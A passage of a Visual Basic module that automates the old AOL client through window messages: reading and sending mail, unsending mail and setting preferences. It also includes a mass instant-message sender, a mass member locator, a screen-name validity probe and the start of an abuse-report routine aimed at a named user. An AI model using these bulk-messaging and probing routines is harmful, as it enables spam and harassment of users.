If TreeCount& = 0& Or MailIndex& > TreeCount& - 1 Or MailIndex& < 0& Then Exit Function
LenSender& = SendMessageLong(AoTree&, LB_GETTEXTLEN, MailIndex&, 0&)
FixedString$ = String(LenSender& + 1, 0&)
Call SendMessageByString(AoTree&, LB_GETTEXT, MailIndex&, FixedString$)
Instance1& = InStr(FixedString$, vbTab)
Instance2& = InStr(Instance1& + 1, FixedString$, vbTab)
MailSenderNew$ = Mid(FixedString$, Instance1& + 1, Instance2& - Instance1& - 1)
End Function
Public Function MailSenderOld(MailIndex As Long) As String
        Dim TabControl As Long, TabPage1 As Long, TabPage2 As Long
        Dim AoTree As Long, LenSender As Long, FixedString As String
        Dim Instance1 As Long, Instance2 As Long, TreeCount As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
If TabPage2& = 0& Then Exit Function
AoTree& = FindWindowEx(TabPage2&, 0&, "_AOL_Tree", vbNullString)
TreeCount& = ListCount(AoTree&)
If TreeCount& = 0& Or MailIndex& > TreeCount& - 1 Or MailIndex& < 0& Then Exit Function
LenSender& = SendMessageLong(AoTree&, LB_GETTEXTLEN, MailIndex&, 0&)
FixedString$ = String(LenSender&, 0&)
Call SendMessageByString(AoTree&, LB_GETTEXT, MailIndex&, FixedString$)
Instance1& = InStr(FixedString$, vbTab)
Instance2& = InStr(Instance1& + 1, FixedString$, vbTab)
MailSenderOld$ = Mid(FixedString$, Instance1& + 1, Instance2& - Instance1& - 1)
End Function
Public Function MailSenderSent(MailIndex As Long) As String
        Dim TabControl As Long, TabPage1 As Long, TabPage2 As Long
        Dim AoTree As Long, LenSender As Long, FixedString As String
        Dim TabPage3 As Long
        Dim Instance1 As Long, Instance2 As Long, TreeCount As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
TabPage3& = FindWindowEx(TabControl&, TabPage2&, "_AOL_TabPage", vbNullString)
If TabPage3& = 0& Then Exit Function
AoTree& = FindWindowEx(TabPage3&, 0&, "_AOL_Tree", vbNullString)
TreeCount& = ListCount(AoTree&)
If TreeCount& = 0& Or MailIndex& > TreeCount& - 1 Or MailIndex& < 0& Then Exit Function
LenSender& = SendMessageLong(AoTree&, LB_GETTEXTLEN, MailIndex&, 0&)
FixedString$ = String(LenSender&, 0&)
Call SendMessageByString(AoTree&, LB_GETTEXT, MailIndex&, FixedString$)
Instance1& = InStr(FixedString$, vbTab)
Instance2& = InStr(Instance1& + 1, FixedString$, vbTab)
MailSenderSent$ = Mid(FixedString$, Instance1& + 1, Instance2& - Instance1& - 1)
End Function
Public Function MailSenderSubjectFlash(MailIndex As Long) As String
        Dim LenSubject As Long, FixedString As String, AoTree As Long
AoTree& = FindWindowEx(FindFlashMailBox&, 0&, "_AOL_Tree", vbNullString)
LenSubject& = SendMessageLong(AoTree&, LB_GETTEXTLEN, MailIndex&, 0&)
FixedString$ = String(LenSubject&, 0&)
Call SendMessageByString(AoTree&, LB_GETTEXT, MailIndex&, FixedString$)
MailSenderSubjectFlash$ = GetInstance(FixedString$, vbTab, 2) & vbTab & GetInstance(FixedString$, vbTab, 3)
End Function
Public Function MailSenderSubjectNew(MailIndex As Long) As String
        Dim TabControl As Long, TabPage1 As Long
        Dim AoTree As Long, LenSubject As Long, FixedString As String
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
If TabPage1& = 0& Then Exit Function
AoTree& = FindWindowEx(TabPage1&, 0&, "_AOL_Tree", vbNullString)
LenSubject& = SendMessageLong(AoTree&, LB_GETTEXTLEN, MailIndex&, 0&)
FixedString$ = String(LenSubject&, 0&)
Call SendMessageByString(AoTree&, LB_GETTEXT, MailIndex&, FixedString$)
MailSenderSubjectNew$ = GetInstance(FixedString$, vbTab, 2) & vbTab & GetInstance(FixedString$, vbTab, 3)
End Function
Public Function MailSenderSubjectOld(MailIndex As Long) As String
        Dim TabControl As Long, TabPage1 As Long, TabPage2 As Long
        Dim AoTree As Long, LenSubject As Long, FixedString As String
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
If TabPage2& = 0& Then Exit Function
AoTree& = FindWindowEx(TabPage2&, 0&, "_AOL_Tree", vbNullString)
LenSubject& = SendMessageLong(AoTree&, LB_GETTEXTLEN, MailIndex&, 0&)
FixedString$ = String(LenSubject&, 0&)
Call SendMessageByString(AoTree&, LB_GETTEXT, MailIndex&, FixedString$)
MailSenderSubjectOld$ = GetInstance(FixedString$, vbTab, 2) & vbTab & GetInstance(FixedString$, vbTab, 3)
End Function
Public Function MailSenderSubjectSent(MailIndex As Long) As String
        Dim TabControl As Long, TabPage1 As Long, TabPage2 As Long
        Dim AoTree As Long, LenSubject As Long, FixedString As String
        Dim TabPage3 As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
TabPage3& = FindWindowEx(TabControl&, TabPage2&, "_AOL_TabPage", vbNullString)
If TabPage3& = 0& Then Exit Function
AoTree& = FindWindowEx(TabPage3&, 0&, "_AOL_Tree", vbNullString)
LenSubject& = SendMessageLong(AoTree&, LB_GETTEXTLEN, MailIndex&, 0&)
FixedString$ = String(LenSubject&, 0&)
Call SendMessageByString(AoTree&, LB_GETTEXT, MailIndex&, FixedString$)
MailSenderSubjectSent$ = GetInstance(FixedString$, vbTab, 2) & vbTab & GetInstance(FixedString$, vbTab, 3)
End Function
Public Sub MailSendNoKill(Person As String, Subject As String, message As String, Optional CheckReturnReceipts As Boolean = False)
        Dim AoFrame As Long, AoToolbar As Long, Toolbar As Long
        Dim AoIcon1 As Long, AoEdit1 As Long
        Dim AoEdit2 As Long, AoEdit3 As Long, RichText As Long
        Dim AoIcon2 As Long, CheckBox As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoToolbar& = FindWindowEx(AoFrame&, 0&, "AOL Toolbar", vbNullString)
Toolbar& = FindWindowEx(AoToolbar, 0&, "_AOL_Toolbar", vbNullString)
AoIcon1& = NextOfClassByCount(Toolbar&, "_AOL_Icon", 2)
Call PostMessage(AoIcon1&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon1&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
AoEdit1& = FindWindowEx(FindSendWindow&, 0&, "_AOL_Edit", vbNullString)
AoEdit2& = FindWindowEx(FindSendWindow&, AoEdit1&, "_AOL_Edit", vbNullString)
AoEdit3& = FindWindowEx(FindSendWindow&, AoEdit2&, "_AOL_Edit", vbNullString)
RichText& = FindWindowEx(FindSendWindow&, 0&, "RICHCNTL", vbNullString)
AoIcon2& = NextOfClassByCount(FindSendWindow&, "_AOL_Icon", 14)
Loop Until FindSendWindow& <> 0& And AoEdit1& <> 0& And AoEdit2& <> 0& And AoEdit3& <> 0& And RichText& <> 0& And AoIcon2& <> 0&
Call WinMinimize(FindSendWindow&)
Call SendMessageByString(AoEdit1&, WM_SETTEXT, 0&, Person$)
Call SendMessageByString(AoEdit3&, WM_SETTEXT, 0&, Subject$)
Call SendMessageByString(RichText&, WM_SETTEXT, 0&, message$)
If CheckReturnReceipts = True Then
CheckBox& = FindWindowEx(FindSendWindow&, 0&, "_AOL_Checkbox", vbNullString)
Call PostMessage(CheckBox&, BM_SETCHECK, True, 0&)
End If
Call PostMessage(AoIcon2&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon2&, WM_LBUTTONUP, 0&, 0&)
End Sub
Public Sub MailSetPreferences(Optional ConfirmMail As Boolean = False, Optional CloseMail As Boolean = True, Optional ConfirmMarked As Boolean = False, Optional RetainSent As Boolean = False, Optional RetainRead As Boolean = False, Optional HyperLinks As Boolean = False)
        Dim MailPreferencesWindow As Long, AoIcon As Long
        Dim ConfirmMailCheckBox As Long, CloseMailCheckBox As Long, ConfirmMarkedCheckBox As Long
        Dim RetainSentCheckBox As Long, RetainReadCheckBox As Long, HyperLinksCheckBox As Long
Call PopUpIcon(2, "P")
Do: DoEvents
MailPreferencesWindow& = FindWindow("_AOL_Modal", "Mail Preferences")
ConfirmMailCheckBox& = FindWindowEx(MailPreferencesWindow&, 0&, "_AOL_Checkbox", vbNullString)
CloseMailCheckBox& = FindWindowEx(MailPreferencesWindow&, ConfirmMailCheckBox&, "_AOL_Checkbox", vbNullString)
ConfirmMarkedCheckBox& = FindWindowEx(MailPreferencesWindow&, CloseMailCheckBox&, "_AOL_Checkbox", vbNullString)
RetainSentCheckBox& = FindWindowEx(MailPreferencesWindow&, ConfirmMarkedCheckBox&, "_AOL_Checkbox", vbNullString)
RetainReadCheckBox& = FindWindowEx(MailPreferencesWindow&, RetainSentCheckBox&, "_AOL_Checkbox", vbNullString)
HyperLinksCheckBox& = NextOfClassByCount(MailPreferencesWindow&, "_AOL_Checkbox", 8)
AoIcon& = FindWindowEx(MailPreferencesWindow&, 0&, "_AOL_Icon", vbNullString)
Loop Until MailPreferencesWindow& <> 0& And ConfirmMailCheckBox& <> 0& And CloseMailCheckBox& <> 0& And ConfirmMarkedCheckBox& <> 0& And RetainSentCheckBox& <> 0& And HyperLinksCheckBox& <> 0& And AoIcon& <> 0&
If ConfirmMail = False Then
Call CheckBoxSetValue(ConfirmMailCheckBox&, False)
ElseIf ConfirmMail = True Then
Call CheckBoxSetValue(ConfirmMailCheckBox&, True)
End If
If CloseMail = True Then
Call CheckBoxSetValue(CloseMailCheckBox&, True)
ElseIf ConfirmMail = False Then
Call CheckBoxSetValue(CloseMailCheckBox&, False)
End If
If ConfirmMarked = False Then
Call CheckBoxSetValue(ConfirmMarkedCheckBox&, False)
ElseIf ConfirmMarked = True Then
Call CheckBoxSetValue(ConfirmMarkedCheckBox&, True)
End If
If RetainSent = False Then
Call CheckBoxSetValue(RetainSentCheckBox&, False)
ElseIf RetainSent = True Then
Call CheckBoxSetValue(RetainSentCheckBox&, True)
End If
If RetainRead = False Then
Call CheckBoxSetValue(RetainReadCheckBox&, False)
ElseIf RetainRead = True Then
Call CheckBoxSetValue(RetainReadCheckBox&, True)
End If
If HyperLinks = False Then
Call CheckBoxSetValue(HyperLinksCheckBox&, False)
ElseIf HyperLinks = True Then
Call CheckBoxSetValue(HyperLinksCheckBox&, True)
End If
Call PostMessage(AoIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon&, WM_LBUTTONUP, 0&, 0&)
End Sub
Public Function MailStatusNew(MailIndex As Long) As String
        Dim TabControl As Long, TabPage As Long, AoTree As Long
        Dim StatusWindow As Long, AoIcon1 As Long, AoIcon2 As Long
        Dim AoView As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
If TabPage& = 0& Then Exit Function
AoTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
Call SendMessageLong(AoTree&, LB_SETCURSEL, MailIndex&, 0&)
AoIcon1& = FindWindowEx(FindMailBox&, 0&, "_AOL_Icon", vbNullString)
AoIcon2& = FindWindowEx(FindMailBox&, AoIcon1&, "_AOL_Icon", vbNullString)
Call PostMessage(AoIcon2&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon2&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
StatusWindow& = FindMailStatusWindow&
AoView& = FindWindowEx(StatusWindow&, 0&, "_AOL_View", vbNullString)
Loop Until StatusWindow& <> 0& And AoView& <> 0& And GetText(AoView&) <> ""
MailStatusNew$ = GetText(AoView&)
Call WinClose(FindMailStatusWindow&)
End Function
Public Function MailStatusOld(MailIndex As Long) As String
        Dim TabControl As Long, TabPage1 As Long, AoTree As Long
        Dim TabPage2 As Long, StatusWindow As Long, AoIcon1 As Long
        Dim AoIcon2 As Long, AoView As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
If TabPage2& = 0& Then Exit Function
AoTree& = FindWindowEx(TabPage2&, 0&, "_AOL_Tree", vbNullString)
Call SendMessageLong(AoTree&, LB_SETCURSEL, MailIndex&, 0&)
AoIcon1& = FindWindowEx(FindMailBox&, 0&, "_AOL_Icon", vbNullString)
AoIcon2& = FindWindowEx(FindMailBox&, AoIcon1&, "_AOL_Icon", vbNullString)
Call PostMessage(AoIcon2&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon2&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
StatusWindow& = FindMailStatusWindow&
AoView& = FindWindowEx(StatusWindow&, 0&, "_AOL_View", vbNullString)
Loop Until StatusWindow& <> 0& And AoView& <> 0& And GetText(AoView&) <> ""
MailStatusOld$ = GetText(AoView&)
Call WinClose(FindMailStatusWindow&)
End Function
Public Function MailStatusSent(MailIndex As Long) As String
        Dim TabControl As Long, TabPage1 As Long, AoTree As Long
        Dim TabPage2 As Long, TabPage3 As Long, StatusWindow As Long
        Dim AoIcon1 As Long, AoIcon2 As Long, AoView As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
TabPage3& = FindWindowEx(TabControl&, TabPage2&, "_AOL_TabPage", vbNullString)
If TabPage3& = 0& Then Exit Function
AoTree& = FindWindowEx(TabPage3&, 0&, "_AOL_Tree", vbNullString)
Call SendMessageLong(AoTree&, LB_SETCURSEL, MailIndex&, 0&)
AoIcon1& = FindWindowEx(FindMailBox&, 0&, "_AOL_Icon", vbNullString)
AoIcon2& = FindWindowEx(FindMailBox&, AoIcon1&, "_AOL_Icon", vbNullString)
Call PostMessage(AoIcon2&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon2&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
StatusWindow& = FindMailStatusWindow&
AoView& = FindWindowEx(StatusWindow&, 0&, "_AOL_View", vbNullString)
Loop Until StatusWindow& <> 0& And AoView& <> 0& And GetText(AoView&) <> ""
MailStatusSent$ = GetText(AoView&)
Call WinClose(FindMailStatusWindow&)
End Function
Public Function MailSubjectFlash(MailIndex As Long) As String
        Dim LenSubject As Long, FixedString As String, PrepSubject As String
        Dim AoTree As Long, Instance As Long, TreeCount As Long
AoTree& = FindWindowEx(FindFlashMailBox&, 0&, "_AOL_Tree", vbNullString)
TreeCount& = ListCount(AoTree&)
If TreeCount& = 0& Or MailIndex& > TreeCount& - 1 Or MailIndex& < 0& Then Exit Function
LenSubject& = SendMessageLong(AoTree&, LB_GETTEXTLEN, MailIndex&, 0&)
FixedString$ = String(LenSubject&, 0&)
Call SendMessageByString(AoTree&, LB_GETTEXT, MailIndex&, FixedString$)
Instance& = InStr(FixedString$, vbTab)
Instance& = InStr(Instance& + 1, FixedString$, vbTab)
FixedString$ = Right(FixedString$, Len(FixedString$) - Instance&)
MailSubjectFlash$ = ReplaceCharacters(FixedString$, vbNullChar, "")
End Function
Public Function MailSubjectNew(MailIndex As Long) As String
        Dim LenSubject As Long, FixedString As String, PrepSubject As String
        Dim TabControl As Long, TabPage As Long, AoTree As Long
        Dim Instance As Long, TreeCount As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
If TabPage& = 0& Then Exit Function
AoTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
TreeCount& = ListCount(AoTree&)
If TreeCount& = 0& Or MailIndex& > TreeCount& - 1 Or MailIndex& < 0& Then Exit Function
LenSubject& = SendMessageLong(AoTree&, LB_GETTEXTLEN, MailIndex&, 0&)
FixedString$ = String(LenSubject&, 0&)
Call SendMessageByString(AoTree&, LB_GETTEXT, MailIndex&, FixedString$)
Instance& = InStr(FixedString$, vbTab)
Instance& = InStr(Instance& + 1, FixedString$, vbTab)
FixedString$ = Right(FixedString$, Len(FixedString$) - Instance&)
MailSubjectNew$ = ReplaceCharacters(FixedString$, vbNullChar, "")
End Function
Public Function MailSubjectOld(MailIndex As Long) As String
        Dim TabControl As Long, TabPage1 As Long, TabPage2 As Long
        Dim AoTree As Long, LenSubject As Long, FixedString As String
        Dim Instance As Long, TreeCount As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
If TabPage2& = 0& Then Exit Function
AoTree& = FindWindowEx(TabPage2&, 0&, "_AOL_Tree", vbNullString)
TreeCount& = ListCount(AoTree&)
If TreeCount& = 0& Or MailIndex& > TreeCount& - 1 Or MailIndex& < 0& Then Exit Function
LenSubject& = SendMessageLong(AoTree&, LB_GETTEXTLEN, MailIndex&, 0&)
FixedString$ = String(LenSubject&, 0&)
Call SendMessageByString(AoTree&, LB_GETTEXT, MailIndex&, FixedString$)
Instance& = InStr(FixedString$, vbTab)
Instance& = InStr(Instance& + 1, FixedString$, vbTab)
FixedString$ = Right(FixedString$, Len(FixedString$) - Instance&)
MailSubjectOld$ = ReplaceCharacters(FixedString$, vbNullChar, "")
End Function
Public Function MailSubjectSent(MailIndex As Long) As String
        Dim TabControl As Long, TabPage1 As Long, TabPage2 As Long
        Dim AoTree As Long, LenSubject As Long, FixedString As String
        Dim Instance As Long, TreeCount As Long, TabPage3 As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
TabPage3& = FindWindowEx(TabControl&, TabPage2&, "_AOL_TabPage", vbNullString)
If TabPage3& = 0& Then Exit Function
AoTree& = FindWindowEx(TabPage3&, 0&, "_AOL_Tree", vbNullString)
TreeCount& = ListCount(AoTree&)
If TreeCount& = 0& Or MailIndex& > TreeCount& - 1 Or MailIndex& < 0& Then Exit Function
LenSubject& = SendMessageLong(AoTree&, LB_GETTEXTLEN, MailIndex&, 0&)
FixedString$ = String(LenSubject&, 0&)
Call SendMessageByString(AoTree&, LB_GETTEXT, MailIndex&, FixedString$)
Instance& = InStr(FixedString$, vbTab)
Instance& = InStr(Instance& + 1, FixedString$, vbTab)
FixedString$ = Right(FixedString$, Len(FixedString$) - Instance&)
MailSubjectSent$ = ReplaceCharacters(FixedString$, vbNullChar, "")
End Function
Public Sub MailToListFlash(listbox As listbox, Optional NumberIndex As Boolean = True)
        Dim LenSubject As Long, FixedString As String, PrepSubject As String
        Dim AoTree As Long, AddMail As Long
AoTree& = FindWindowEx(FindFlashMailBox&, 0&, "_AOL_Tree", vbNullString)
For AddMail& = 0& To ListCount(AoTree&) - 1
LenSubject& = SendMessageLong(AoTree&, LB_GETTEXTLEN, AddMail&, 0&)
FixedString$ = String(LenSubject&, 0&)
Call SendMessageByString(AoTree&, LB_GETTEXT, AddMail&, FixedString$)
PrepSubject$ = GetInstance(FixedString$, vbTab, 3)
If NumberIndex = True Then
listbox.AddItem AddMail& + 1 & ". " & PrepSubject$
Else
listbox.AddItem PrepSubject$
End If
Next AddMail&
End Sub
Public Sub MailToListNew(listbox As listbox, Optional NumberIndex As Boolean = True)
        Dim LenSubject As Long, FixedString As String, PrepSubject As String
        Dim TabControl As Long, TabPage As Long, AoTree As Long, AddMail As Long
listbox.Clear
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
If TabPage& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
For AddMail& = 0& To ListCount(AoTree&) - 1
LenSubject& = SendMessageLong(AoTree&, LB_GETTEXTLEN, AddMail&, 0&)
FixedString$ = String(LenSubject&, 0&)
Call SendMessageByString(AoTree&, LB_GETTEXT, AddMail&, FixedString$)
PrepSubject$ = GetInstance(FixedString$, vbTab, 3)
If NumberIndex = True Then
listbox.AddItem AddMail& + 1 & ". " & PrepSubject$
Else
listbox.AddItem PrepSubject$
End If
Next AddMail&
End Sub
Public Sub MailToListOld(listbox As listbox, Optional NumberIndex As Boolean = True)
        Dim LenSubject As Long, FixedString As String, PrepSubject As String
        Dim TabControl As Long, TabPage As Long, AoTree As Long, AddMail As Long
        Dim TabPage2 As Long
listbox.Clear
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
If TabPage2& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage2&, 0&, "_AOL_Tree", vbNullString)
For AddMail& = 0& To ListCount(AoTree&) - 1
LenSubject& = SendMessageLong(AoTree&, LB_GETTEXTLEN, AddMail&, 0&)
FixedString$ = String(LenSubject&, 0&)
Call SendMessageByString(AoTree&, LB_GETTEXT, AddMail&, FixedString$)
PrepSubject$ = GetInstance(FixedString$, vbTab, 3)
If NumberIndex = True Then
listbox.AddItem AddMail& + 1 & ". " & PrepSubject$
Else
listbox.AddItem PrepSubject$
End If
Next AddMail&
End Sub
Public Sub MailToListSent(listbox As listbox, Optional NumberIndex As Boolean = True)
        Dim LenSubject As Long, FixedString As String, PrepSubject As String
        Dim TabControl As Long, TabPage As Long, AoTree As Long, AddMail As Long
        Dim TabPage2 As Long, TabPage3 As Long
listbox.Clear
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
TabPage3& = FindWindowEx(TabControl&, TabPage2&, "_AOL_TabPage", vbNullString)
If TabPage3& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage3&, 0&, "_AOL_Tree", vbNullString)
For AddMail& = 0& To ListCount(AoTree&) - 1
LenSubject& = SendMessageLong(AoTree&, LB_GETTEXTLEN, AddMail&, 0&)
FixedString$ = String(LenSubject&, 0&)
Call SendMessageByString(AoTree&, LB_GETTEXT, AddMail&, FixedString$)
PrepSubject$ = GetInstance(FixedString$, vbTab, 3)
If NumberIndex = True Then
listbox.AddItem AddMail& + 1 & ". " & PrepSubject$
Else
listbox.AddItem PrepSubject$
End If
Next AddMail&
End Sub
Public Function MailTosCheck(SN As String) As String
        Dim ErrorWin As Long, AoView As Long, ViewText As String
        Dim MessageOk As Long, OKButton As Long
Call MailSendNoKill("*, " & SN$, "Tos check.", "")
Do: DoEvents
ErrorWin& = FindErrorWindow&
AoView& = FindWindowEx(ErrorWin&, 0&, "_AOL_View", vbNullString)
ViewText$ = GetText(AoView&)
Loop Until ErrorWin& <> 0& And AoView& <> 0 And ViewText$ <> ""
If InStr(LCase(TrimSpaces(ViewText$)), LCase(TrimSpaces(SN$ & " - This is not a known member."))) <> 0& Then
MailTosCheck$ = "invalid"
ElseIf InStr(LCase(TrimSpaces(ViewText$)), LCase(TrimSpaces(SN$ & " - This member is currently not accepting e-mail from your account."))) <> 0& Then
MailTosCheck$ = "valid, no mail"
ElseIf InStr(LCase(TrimSpaces(ViewText$)), LCase(TrimSpaces(SN$ & " - This member is currently not accepting e-mail attachments or embedded files."))) <> 0& Then
MailTosCheck$ = "valid, no attached files"
ElseIf InStr(LCase(TrimSpaces(ViewText$)), LCase(TrimSpaces(SN$ & " - This member's mailbox is full."))) <> 0& Then
MailTosCheck$ = "valid, full mailbox"
ElseIf Len(SN$) > 16 Then
MailTosCheck$ = "invalid length"
Else
MailTosCheck$ = "valid"
End If
Call PostMessage(FindErrorWindow&, WM_CLOSE, 0&, 0&)
Call PostMessage(FindSendWindow&, WM_CLOSE, 0&, 0&)
Do: DoEvents
MessageOk& = FindWindow("#32770", "America Online")
OKButton& = FindWindowEx(MessageOk&, 0&, "Button", "&No")
Loop Until MessageOk& <> 0& And OKButton& <> 0&
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
End Function
Public Sub MailUnSend(Index As Long)
        Dim MailLst As Long, LstTab As Long, LstTabs As Long, LstWin As Long
        Dim UnSendButton As Long, AoModal As Long
        Dim Button1 As Long, Button2 As Long
        Dim okwin As Long, OKButton As Long
MailLst& = FindMailList(mailSENT)
LstTab& = GetParent(MailLst&)
If LstTab& = 0& Then Exit Sub
LstTabs& = GetParent(LstTab&)
LstWin& = GetParent(LstTabs&)
Call PostMessage(MailLst&, LB_SETCURSEL, CLng(Index&), 0&)
UnSendButton& = FindWindowEx(LstWin&, 0&, "_AOL_Icon", vbNullString)
UnSendButton& = FindWindowEx(LstWin&, UnSendButton&, "_AOL_Icon", vbNullString)
UnSendButton& = FindWindowEx(LstWin&, UnSendButton&, "_AOL_Icon", vbNullString)
UnSendButton& = FindWindowEx(LstWin&, UnSendButton&, "_AOL_Icon", vbNullString)
UnSendButton& = FindWindowEx(LstWin&, UnSendButton&, "_AOL_Icon", vbNullString)
Call PostMessage(UnSendButton&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(UnSendButton&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
AoModal& = FindWindow("_AOL_Modal", vbNullString)
Button1& = FindWindowEx(AoModal&, 0&, "_AOL_Icon", vbNullString)
Button2& = FindWindowEx(AoModal&, Button1&, "_AOL_Icon", vbNullString)
okwin& = FindWindow("#32770", "America Online")
OKButton& = FindWindowEx(okwin&, 0&, "Button", vbNullString)
Loop Until AoModal& <> 0& And Button2& <> 0& Or okwin& <> 0& And OKButton& <> 0&
If AoModal& <> 0& And Button2& <> 0& Then
Call PostMessage(Button2&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(Button2&, WM_LBUTTONUP, 0&, 0&)
ElseIf okwin& <> 0& And OKButton& <> 0& Then
Do: DoEvents
Call PostMessage(OKButton&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(OKButton&, WM_LBUTTONUP, 0&, 0&)
OKButton& = FindWindowEx(okwin&, 0&, "Button", vbNullString)
Loop Until OKButton& = 0&
End If
Do: DoEvents
okwin& = FindWindow("#32770", "America Online")
OKButton& = FindWindowEx(okwin&, 0&, "Button", vbNullString)
Loop Until okwin& <> 0& And OKButton& <> 0&
Do: DoEvents
Call PostMessage(OKButton&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(OKButton&, WM_LBUTTONUP, 0&, 0&)
OKButton& = FindWindowEx(okwin&, 0&, "Button", vbNullString)
Loop Until OKButton& = 0&
End Sub
Public Sub MassImCheck(NamesList As Control)
'Checks to see if the IMs on your list are currently recieving Instant messages
        Dim ListIndex As Long
On Error Resume Next
For ListIndex& = 0& To NamesList.ListCount - 1
NamesList.List(ListIndex&) = IMCheck(NamesList.List(ListIndex&))
DoEvents
Next ListIndex&
End Sub
Public Sub MassLocator(NamesList As Control)
'Locates a mass number of people that are on a list
        Dim ListIndex As Long
On Error Resume Next
For ListIndex& = 0& To NamesList.ListCount - 1
NamesList.List(ListIndex&) = LocateMember(NamesList.List(ListIndex&))
DoEvents
Next ListIndex&
End Sub
Public Sub MassInstantMessage(screennamelist As Control, message As String, Optional Delay As Single = "0.6", Optional KillImAfter As Boolean = True)
'A massimer
        Dim ListIndex As Long
On Error Resume Next
For ListIndex& = 0 To screennamelist.ListCount - 1
Call InstantMessage(screennamelist.List(ListIndex&), message$)
Call Pause(Val(Delay))
If KillImAfter = True Then WinClose FindIM
Next ListIndex&
End Sub
Public Sub MemberRoom(DaRoom As String)
Call Keyword("aol://2719:61-2-" & DaRoom$)
End Sub
Public Function NextOfClassByCount(ParentWin As Long, ClassWin As String, ByCount As Long) As Long
        Dim NextOfClass As Long, NextWin As Long
If ByCount& > ClassInstance(ParentWin&, ClassWin$) Then Exit Function
If FindWindowEx(ParentWin&, 0&, ClassWin$, vbNullString) = 0& Then Exit Function
For NextOfClass& = 1 To ByCount&
NextWin& = FindWindowEx(ParentWin&, NextWin&, ClassWin$, vbNullString)
Next NextOfClass&
NextOfClassByCount& = NextWin&
End Function
Public Sub NotifyAolChat(PersonToTos As String, TosViolation As String)
'Maybe for a TOSer???? Heh, dont use this there bad and lame.
        Dim AoFrame As Long, AoMDI As Long, ChatWin As Long, NotifyButton As Long
        Dim TosWin As Long, CategoryCombo As Long, DateTimeBox As Long, RoomNameBox As Long
        Dim PersonBox As Long, ViolationBox As Long, SendButton1 As Long, SendButton As Long
